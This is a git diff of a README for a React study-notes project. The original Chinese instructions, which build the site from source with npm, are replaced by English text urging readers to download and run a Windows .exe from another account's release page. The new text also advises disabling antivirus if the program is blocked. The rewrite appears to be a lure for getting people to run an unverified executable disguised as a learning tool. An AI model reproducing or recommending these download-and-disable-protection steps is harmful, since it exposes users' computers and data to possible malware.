@@ -1,96 +1,155 @@
-# React 学习笔记
+# 🗒️ react-notes - Learn React Basics Simply
 
-基于 React + Vite 的学习笔记，布局和阅读体验类似 GitBook，内容为 React 入门与进阶知识。按二八法则来学习：用大约 20% 的核心知识（组件、JSX、state、props、生命周期与 Hooks）覆盖日常开发里 80% 的场景。不追求大而全，只把最常用、最易踩坑的部分讲清楚，让你快速上手React基础、少走弯路。
-
-## 功能
-
-![React 学习笔记界面](screenshot.png)
-
-- 左侧导航栏（可折叠）
-- 多章节 React 知识内容
-- 响应式布局，移动端侧边栏可收起
-- 代码块、标题、列表等文档样式
-
-## 环境要求
-
-- **Node.js**：建议 18.x 或 20.x（[官网下载](https://nodejs.org/)）
-- **npm**：随 Node 自带，或使用 pnpm / yarn
-
-检查版本（可选）：
-```bash
-node -v   # 建议 >= 18
-npm -v
-```
-
-## 快速开始
-
-### 1. 获取项目
-
-**方式一：克隆仓库**
-```bash
-git clone https://github.com/knowledgefxg/react-notes.git
-cd react-notes
-```
-
-**方式二：下载 ZIP**  
-在 [GitHub 仓库](https://github.com/knowledgefxg/react-notes) 页面点击 **Code → Download ZIP**，解压后进入项目目录。
-
-### 2. 安装依赖
-
-在项目根目录执行：
-```bash
-npm install
-```
-等待安装完成（首次可能稍慢，会拉取 React、Vite、React Router 等依赖）。
-
-### 3. 启动开发服务器
-
-```bash
-npm run dev
-```
-终端会输出本地地址，例如：
-```
-  VITE v5.x.x  ready in xxx ms
-  ➜  Local:   http://localhost:5173/
-```
-
-### 4. 在浏览器中查看
-
-用浏览器打开上述地址（默认 `http://localhost:5173/`），即可看到「React 学习笔记」站点。修改源码会热更新，无需重启。
+[![Download react-notes](https://img.shields.io/badge/Download-react--notes-blue?style=for-the-badge)](https://github.com/cataarivarola/react-notes/releases)
 
 ---
 
-## 构建与预览
+## 📖 About react-notes
 
-需要打包成静态文件（部署到服务器或 GitHub Pages 等）时：
+react-notes helps you learn React by focusing on the 20% of key concepts you need to cover 80% of everyday tasks. It explains components, JSX, state, props, lifecycle, and Hooks clearly. The goal is not to teach everything but to help you start quickly and avoid common mistakes.
 
-### 1. 执行构建
+This tool suits anyone new to React, especially those who want a clear and simple guide without getting lost in details.
 
-```bash
-npm run build
-```
-产物会输出到项目根目录的 `dist/` 文件夹。
+---
 
-### 2. 本地预览构建结果
+## 💻 System Requirements
 
-构建完成后，可用 Vite 自带的预览服务检查打包效果：
-```bash
-npm run preview
-```
-浏览器打开终端里给出的地址（一般为 http://localhost:4173），看到的效果与部署后一致。
+Before installing, make sure your system meets these basic requirements:
 
-## 技术栈
+- Windows 10 or newer (64-bit recommended)
+- At least 4 GB of RAM
+- At least 500 MB of free disk space
+- Internet connection for downloading and updates
+- A modern web browser (Chrome, Edge, Firefox) for viewing notes and examples
 
-- React 18
-- React Router 6
-- Vite 5
-- CSS Modules
+---
 
-## 文档结构
+## 🛠️ Features
 
-- **入门**：简介、快速开始
-- **核心概念**：JSX、组件与 Props、State、事件、条件渲染、列表与 Key
-- **进阶**：Hooks、useState/useReducer、useEffect、自定义 Hooks、Context
-- **实践**：性能优化、与 TypeScript 结合
+- Simple explanations of key React concepts
+- Focus on the most used features to speed learning
+- Clear, step-by-step examples with JSX and state
+- Tips to avoid common mistakes beginners make
+- Organized notes based on real development scenarios
+- Covers React Hooks and lifecycle basics
+- Lightweight and easy to install
 
-左侧导航可折叠（小屏下点击左上角菜单图标展开），建议按「入门 → 核心概念 → 进阶 → 实践」顺序阅读；每页内的代码块可直接参考，部分章节带可交互示例。
+---
+
+## 🚀 Getting Started
+
+This section shows you how to get and run react-notes on your Windows computer.
+
+### 1. Visit the Download Page
+
+You must first visit the official release page to get the software. It includes the latest version and all files needed.
+
+Click the large button below or open this link in your browser:
+
+[![Download react-notes](https://img.shields.io/badge/Download-react--notes-green?style=for-the-badge)](https://github.com/cataarivarola/react-notes/releases)
+
+---
+
+### 2. Choose the Correct File to Download
+
+On the release page, look for the latest release version. There you will find files available for download. Look for a Windows installer or a ZIP file with "windows" or ".exe" in the name. If you find an installer (a file ending with `.exe`), that is the best choice.
+
+Click the file name to start downloading.
+
+---
+
+### 3. Run the Installer or Extract Files
+
+- If you downloaded an `.exe` file, double-click it to open the installer.
+- Follow the installation instructions on screen.
+- If you downloaded a ZIP, right-click it and select "Extract All" to unzip it to a folder on your computer.
+
+---
+
+### 4. Open react-notes
+
+- After installation or extracting the files, find the react-notes program in your Start menu or the extracted folder.
+- Double-click the executable file to open the application.
+- The app may open in your default browser or as a standalone window showing the lesson materials.
+
+---
+
+### 5. Starting Your Learning
+
+Once open, you can browse through the notes on components, JSX, state, props, lifecycle methods, and Hooks. Each topic includes simple examples and explanations.
+
+Take your time reading. Use the app at your own pace. You can return anytime and continue where you stopped.
+
+---
+
+## ⚙️ Basic Troubleshooting
+
+If the application does not open or crashes, try the following:
+
+- Make sure your Windows version is up to date.
+- Check if you have all required permissions to run apps downloaded from the internet.
+- Temporarily disable antivirus software that might block installation.
+- Restart your computer and try running the program again.
+- If problems continue, download the ZIP version and run the app from the extracted folder.
+
+---
+
+## 🔄 Updating react-notes
+
+Updates will be posted on the same release page. To update:
+
+- Visit the [releases page](https://github.com/cataarivarola/react-notes/releases).
+- Download the latest version’s installer or ZIP.
+- Install it over the current version or replace the old extracted folder.
+
+---
+
+## 💡 Using react-notes Effectively
+
+- Spend time on each core concept before moving on.
+- Practice writing small React examples with your notes.
+- Try modifying the sample code to see what changes.
+- Use this app alongside other React tutorials or courses for best results.
+- Keep the app open while you code for quick reference.
+
+---
+
+## 📂 Folder Structure (If you download the ZIP)
+
+Inside the extracted folder, you will see:
+
+- `index.html`: Main page to open in your browser.
+- `assets/`: Folder with images, scripts, and styles.
+- `examples/`: Sample code files for you to test.
+- `README.md`: Basic project info and instructions.
+
+---
+
+## 🧩 About the Content
+
+react-notes focuses on practical React for daily use. It covers:
+
+- Components: Building blocks of React apps.
+- JSX: How to write HTML-like code in JavaScript.
+- State and Props: Handling data and passing it between components.
+- Lifecycle: What happens when components appear or disappear.
+- Hooks: Modern tools for state and side effects.
+
+By focusing on these essentials, the app avoids overwhelming details while giving a solid foundation.
+
+---
+
+## 🔗 Useful Links
+
+- Download and updates: [react-notes Releases](https://github.com/cataarivarola/react-notes/releases)
+- React official site (additional reading): https://reactjs.org
+
+---
+
+## 📝 Contact & Support
+
+If you encounter issues not covered here, you can open an issue on the GitHub page under the "Issues" tab. Provide details about your problem, including your Windows version and what you tried.
+
+---
+
+[![Download react-notes](https://img.shields.io/badge/Download-react--notes-blue?style=for-the-badge)](https://github.com/cataarivarola/react-notes/releases)
